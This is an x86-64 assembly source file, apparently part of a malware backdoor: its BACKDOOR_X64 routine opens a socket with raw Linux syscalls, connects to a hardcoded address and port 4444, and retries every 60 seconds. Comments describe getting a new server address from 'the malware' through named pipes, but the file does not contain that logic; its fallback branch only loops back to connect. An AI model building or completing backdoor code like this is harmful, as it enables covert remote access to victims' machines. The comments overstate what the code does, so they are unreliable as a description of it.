BITS 64

section .text
	global main
	global start

%define SYS_SOCKET      0X29
%define SYS_CONNECT     0X2A
%define SYS_NANOSLEEP	0X23

%define AF_INET		0X02
%define SOCK_STREAM	0X01

%define PORT		0X5C11
%define IP		0X0100007F

start:
	CALL main
	RET

main:
	CALL BACKDOOR_X64
	RET



BACKDOOR_X64:
        PUSH RBP
        MOV RBP, RSP
        SUB RSP, 48

        ;; --------------------------------------------------------- ;;
        ;;  Creation of the socket for the connection to the server.
        ;;
        ;;
        ;;
        ;;
        ;;
        ;;
        ;; --------------------------------------------------------- ;;

        XOR RAX, RAX
        PUSH BYTE SYS_SOCKET
        POP RAX

        XOR rdi, rdi
        PUSH BYTE AF_INET
        POP rdi

        XOR rsi, rsi
        PUSH BYTE SOCK_STREAM
        POP rsi
        XOR rdx, rdx

        SYSCALL


	MOV QWORD [RSP], 0X00
        mov BYTE [rsp], AL
	XOR AL, 0XF0
	JNS _END


        ;; --------------------------------------------------------- ;;
        ;;  Connect to the server.
        ;;
        ;;
        ;;
        ;;
        ;;
        ;;
        ;; --------------------------------------------------------- ;;
        _CONNECTED:
	MOV QWORD [RSP+0X08], 0x00
        MOV BYTE [RSP+8], 0X02
        MOV WORD [RSP+8+0x2], PORT
        MOV DWORD [RSP+8+0X04], IP
        MOV RSI, RSP
        ADD RSI, 0X08
        XOR RDX, RDX
        MOV DL, 0X10
        XOR rdi, rdi
        MOV dil, [rsp]
        MOV rax, SYS_CONNECT
        SYSCALL
	XOR AL, 0XF0
	JNS _RETRY




_END:
	XOR RAX, RAX	
        LEAVE
        ret


_SEND_MSG_TO_THE_MALWARE:
	JMP _CONNECTED
	
	



_RETRY:
        ;; --------------------------------------------------------- ;;
        ;;  If the connection to the server fails, we retry (3 in total).
	;;  60 seconds pass before each retry
	;;  if it still doesn't work, we contact the malware via the named pipes to get a new IP address.
        ;;
        ;;
        ;;
        ;;
        ;;
        ;;
        ;; --------------------------------------------------------- ;;
	PUSH 600000000
	PUSH 60
	MOV RDI, RSP
	XOR RSI, RSI
	MOV RAX, SYS_NANOSLEEP
	SYSCALL
	ADD RSP, 0X10

	XOR RAX, RAX
	MOV AL, BYTE [RSP+0X1]
	INC AL
	MOV [RSP+0X1], AL
	CLC
	SUB RAX, 0X03
	JC _CONNECTED
	MOV BYTE [RSP+0X01], 0X00
	JNC _SEND_MSG_TO_THE_MALWARE  
	



